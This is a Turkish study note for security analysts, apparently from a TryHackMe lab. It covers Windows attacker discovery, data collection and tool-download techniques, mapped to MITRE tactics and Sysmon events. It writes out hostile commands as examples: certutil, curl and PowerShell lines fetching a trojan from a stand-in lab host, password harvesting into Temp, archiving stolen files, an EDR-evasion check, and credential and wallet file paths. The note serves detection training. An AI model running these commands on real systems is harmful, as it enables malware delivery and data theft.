# 🪟 Windows Threat Detection 2 — Discovery / Collection / Exfiltration Notu

**Etiketler:** `#SOC` `#ThreatDetection` `#Discovery` `#Collection` `#Exfiltration` `#IngressToolTransfer` `#Sysmon` `#WindowsEventLogs` `#LivingOffTheLand` `#TryHackMe`

  
## 🏛️ 1. Mimari Yapı ve Saldırı Yaşam Döngüsü (Post-Compromise Lifecycle)

Saldırganlar sisteme ilk adımı attıktan sonra (**Initial Access**) doğrudan hedefledikleri verilere ulaşamazlar. Önlerinde bilmedikleri bir işletim sistemi mimarisi, ağ yapısı ve aktif güvenlik yazılımları (EDR/AV) vardır. Bu sebeple saldırgan hemen iki temel aşamayı işletir:

  

1. **Durumsal Farkındalık & Keşif (Situational Awareness & Discovery):** "Ben kimim?", "Hangi makinedeyim?", "Yetkilerim neler?", "Beni izleyen bir EDR var mı?".
    
      
    
2. **Toplama ve Sızdırma (Collection & Exfiltration):** Parolalar, SSH anahtarları, hassas PDF/Word dökümanları ve kripto cüzdanları toplanıp sıkıştırılır, ardından dış komuta kontrol (C2) veya bulut altyapısına (AWS S3) aktarılır.
    
      
    
3. **Araç Transferi (Ingress Tool Transfer):** Saldırganlar sistemde eksik olan exploit veya red team araçlarını (Mimikatz, Seatbelt vb.) işletim sisteminde yerleşik araçları kullanarak (**Living off the Land - LotL**) içeri çekerler.

## 🔍 2. Keşif Taktikleri (Discovery Tactics & Living off the Land)

Tehdit aktörleri keşif yaparken antivirüs radarına takılmamak için Windows'un kendi yerleşik komutlarını (`cmd.exe`, `powershell.exe`) kullanırlar.

  

### 🔹 Amaca Göre Keşif Komutları Matrisi

|**Keşif Amacı (Discovery Purpose)**|**Kullanılan Standart Komutlar (CMD / PowerShell)**|**Analist Gözüyle Anlamı & Tehdit**|
|---|---|---|
|**Dosyalar ve Klasörler (Files & Folders)**|`type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`|Kurbanın görevini, sistemin amacını ve ilgi çekici dökümanları anlamak.|
|**Kullanıcılar ve Gruplar (Users & Groups)**|`whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser`|Sistemde kimlerin kayıtlı olduğunu ve aktif kullanıcının yetkilerini (Admin vb.) tespit etmek.|
|**Sistem ve Uygulamalar (System & Apps)**|`tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service`|Çalışan süreçleri, kurulu yazılımları ve yama/zafiyet durumunu haritalandırmak.|
|**Ağ Ayarları (Network Settings)**|`ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles`|Makinenin bir kurumsal etki alanına (AD Domain) ait olup olmadığını ve açık bağlantıları görmek.|
|**Aktif Antivirüs / EDR (Active Security)**|`Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"`|Saldırıya devam etmenin riskli olup olmadığını anlamak; EDR süreçlerini tespit etmek.|

### 🔹 CMD vs. GUI Keşif Ağaçları

#### 1. Komut Satırı Üzerinden Keşif (Süreç Ağacı):

Zararlı bir belge (`invoice.pdf.exe`) açıldığında Sysmon loglarında oluşan hiyerarşi:

  

Plaintext

```
C:\Users\victim\Downloads\invoice.pdf.exe
├── C:\Windows\System32\cmd.exe
│   ├── ipconfig                                 // Ağ ayarlarını listeler
│   ├── whoami /priv                             // Ayrıcalıkları ve token haklarını döker
│   ├── dir                                      // Dizin içeriğini listeler
│   ├── net user                                 // Yerel kullanıcıları sorgular
│   ├── tasklist /v                              // Çalışan tüm süreçleri detaylı gösterir
│   └── wmic computersystem get model            // Donanım/PC modelini çeker
└── C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    ├── Get-Service                              // Aktif servisleri listeler
    └── Get-MpPreference                         // Windows Defender yapılandırmasını okur
```

#### 2. Grafik Arayüz (GUI / RDP) Üzerinden Keşif:

Saldırgan RDP ile oturum açtığında komut satırı yerine yerleşik grafik araçlarını kullanabilir:

  

Plaintext

```
C:\Windows\System32\explorer.exe
├── C:\Windows\System32\cmd.exe                                   // Komut istemcisi
├── C:\Windows\system32\mmc.exe C:\Windows\system32\compmgmt.msc  // Bilgisayar Yönetimi Paneli
├── C:\Windows\system32\control.exe netconnections                // Ağ Bağdaştırıcıları Listesi
├── C:\Windows\ImmersiveControlPanel\SystemSettings.exe           // Windows Ayarlar Menüsü
├── C:\Windows\system32\notepad.exe C:\...\secrets.txt            // Not Defteri ile dosya okuma
└── C:\Windows\system32\taskmgr.exe                               // Görev Yöneticisi çalıştırma
```

> [!WARNING]
> 
> **EDR Varlık Kontrolü Tuzağı:**
> 
>   
> 
> Saldırganlar sistemde Microsoft Defender for Endpoint (EDR) olup olmadığını denetlemek için şu komutu çalıştırırlar:
> 
>   
> 
> `cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"`
> 
>   
> 
> Bu komutta `MsSense.exe` doğrudan Defender for Endpoint servisidir. Eğer servis bulunamazsa `||` (OR) mantıksal operatörü devreye girerek saldırgana ortamın güvenli olduğunu bildirir.
> 
>   

## 📂 3. Veri Toplama ve Sızdırma (Collection & Exfiltration)

Saldırgan sistemde varlığını kesinleştirdikten sonra verileri toplamaya başlar. Bu aşama MITRE'da **Collection (TA0009)**, **Credential Access (TA0006)** ve **Exfiltration (TA0010)** taktikleriyle temsil edilir.

  

### 🔹 Tehdit Aktörlerinin Standart Hedef Dosya Yolları

Plaintext

```
# [HEDEF: Şantaj & Sosyal Mühendislik] - Mesajlaşma & Tarayıcı Geçmişi
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History

# [HEDEF: Finans & Kripto Hırsızlığı] - Oturum Çerezleri & Cüzdan Dosyaları
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# [HEDEF: Kurumsal Ağlara Sızma] - SSH Anahtarları & Veritabanları
C:\Users\<user>\.ssh\* (Örn: id_rsa, thm-access-database.key)
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

### 🔹 Veri Toplama Tespiti (Collection Detection Playbook)

|**Komut / Araç Örneği**|**Açıklama ve Analist Tespiti**|
|---|---|
|`notepad.exe C:\Users\<user>\Desktop\finances-2025.csv`|Not Defteri ile hassas finansal dökümanların doğrudan açılması.|
|`type debug-logs.txt \| findstr password > C:\Temp\passwords.txt`|Düz metin loglarda "password" kelimesinin aranıp Temp dizinine yazılması.|
|`Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf`|Kullanıcı dizinindeki tüm PDF dosyalarının özyinelemeli taranması.|
|`copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\`|Signal mesaj geçmişinin aşamalandırma (staging) dizinine kopyalanması.|
|`Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip`|PowerShell ile toplanan verilerin sızdırma öncesi tek arşivde sıkıştırılması.|
|`7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*`|7-Zip komut satırı aracıyla şifreli/sıkıştırılmış veri arşivi oluşturulması.|

> [!TIP]
> 
> **Data Stealer (Bilgi Hırsızı) Malware Davranışı:**
> 
>   
> 
> Gremlin veya RedLine gibi özel bilgi hırsızları (stealer) genellikle komut satırı çalıştırmaz; kendi C/C++ veya .NET kodları üzerinden doğrudan Chrome SQLite veritabanlarını, Telegram oturumlarını ve panoyu okur. Bu tür zararlıların adli analizinde Sysmon **Event ID 11** (oluşturulan `staging_xxxx` geçici klasörleri) ve **Event ID 22** (AWS S3 veya C2 alan adlarına yapılan DNS çağrıları) izlenmelidir.
> 
>   

## 📥 4. Araç Transferi İstismarı (Ingress Tool Transfer - Living off the Land)

Saldırganlar sisteme ilk girdiklerinde tüm araçları yanlarında getirmezler; güvenlik duvarını ve AV tespitini atlatmak için işletim sisteminde yerleşik araçları kullanarak dışarıdan araç indirirler (**MITRE: T1105**).

  

### 🔹 Araç İndirme Yöntemleri ve Canlı Komut Parametreleri

PowerShell

```
# 1. YÖNTEM: CERTUTIL İLE DOSYA İNDİRME
certutil.exe -urlcache -f http://appsforfree.thm/trojan.exe notatrojan.exe
```

- `certutil.exe`: Normalde Windows sertifika yönetim aracıdır; ancak web'den dosya çekme özelliği kötüye kullanılır.
    
      
    
- `-urlcache`: URL önbelleğini görüntüler veya temizler; dosya çekme fonksiyonunu tetikler.
    
      
    
- `-f`: Belirtilen URL'deki içeriği zorla (`force`) indirir ve yerel diske yazar.
    
      
    
- `[http://appsforfree.thm/trojan.exe](http://appsforfree.thm/trojan.exe)`: İndirilecek zararlı dosyanın uzak adresi.
    
      
    
- `notatrojan.exe`: Dosyanın diske kaydedileceği yerel isim.
    
      
    

Bash

```
# 2. YÖNTEM: CURL İLE DOSYA İNDİRME (Windows 10 ve üzeri yerleşik)
curl.exe http://appsforfree.thm/trojan.exe -o good.exe
```

- `curl.exe`: Ağ üzerinden veri transferi yapan standart araçtır.
    
      
    
- `-o good.exe`: İndirilen veriyi ekrana basmak yerine belirtilen yerel dosya adına yazar (`output`).
    
      
    

PowerShell

```
# 3. YÖNTEM: POWERSHELL INVOKE-WEBREQUEST (IWR)
powershell.exe -c "Invoke-WebRequest -Uri 'http://appsforfree.thm/trojan.exe' -OutFile 'trojanfake.exe'"
```

- `powershell.exe -c`: PowerShell konsolunu açıp tırnak içindeki komutu çalıştırır.
    
      
    
- `Invoke-WebRequest` (veya takma adı `iwr`): HTTP/HTTPS üzerinden istek atan cmdlet.
    
      
    
- `-Uri '...'`: İndirilecek dosyanın kaynak bağlantısı.
    
      
    
- `-OutFile '...'`: İndirilen içeriğin kaydedileceği hedef yerel dosya adı.

## 🚦 6. Tekrar Kategorisi & 3 Dakikalık Pazar Tekrar Stratejisi

### 🔴 Kırmızı Sınıf: Pratik Keşif/Sızdırma Komutları & Sysmon Olay Eşleştirmesi

Bu modül **Kırmızı Sınıf** (Komut İmzaları, CLI Parametreleri ve Sysmon Telemetri Korelasyonu) kategorisindedir.

  

### ⏱️ Pazar Günü 3 Dakikalık Hızlı Tekrar Rutini

1. **Discovery Komutlarını Hatırla (1. Dakika):**
    
      
    - Kullanıcı: `whoami /priv`, `net user`, `net localgroup`
        
          
        
    - Ağ: `ipconfig /all`, `netstat -ano`
        
          
        
    - Savunma Kontrolü: `tasklist /v | findstr MsSense.exe` (Defender for Endpoint EDR avı).
        
          
        
2. **Collection ve Stealer İzlerini Sırala (2. Dakika):**
    
      
    - Hassas Dizinler: `AppData\Local\Google\Chrome\User Data\...`, `~/.ssh/`
        
          
        
    - Pano Hırsızlığı: `Get-ClipBoard`
        
          
        
    - Dosya Toplama: `staging_xxxx` klasörleri (Sysmon ID 11) + Arşivleme (`Compress-Archive`, `7za.exe`).
        
          
        
3. **Ingress Tool Transfer ve Sızdırma İmzaları (3. Dakika):**
    
      
    - Araç İndirme: `certutil.exe -urlcache -f <url>`, `curl.exe -o`, `Invoke-WebRequest -OutFile`.
        
          
        
    - Mülakat Sorusu: _"Bir makinede zararlı komutların keşif mi yoksa meşru IT aktivitesi mi olduğunu nasıl anlarsın?"_
        
          
        
        _Cevap:_ _"Sürecin üst sürecine (ParentProcessId) bakarım. Eğer `whoami` veya `net user` komutları Word, Excel, şüpheli bir PDF/EXE veya bilinmeyen bir script altından tetiklenmişse ve peş peşe hızlıca çalıştırılmışsa bu doğrudan otomatik bir Discovery aktivitesidir."_
